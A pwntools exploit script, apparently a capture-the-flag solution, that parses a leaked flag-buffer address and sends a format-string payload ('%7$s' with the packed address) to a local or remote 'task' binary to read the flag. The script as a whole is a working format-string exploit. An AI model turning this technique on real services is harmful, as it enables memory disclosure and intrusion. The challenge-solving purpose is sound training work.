from pwn import *

elf = context.binary = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main+182",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)

p.recvuntil(b'Flag buffer:')
addr = p.recvline().strip().split()[-1]
addr = int(addr.decode(), 16)

print(f"flag addr: {hex(addr)}")
p.sendline(b'%7$s' + b'\x00' * 4 + p64(addr))

print(p.clean(1.0))
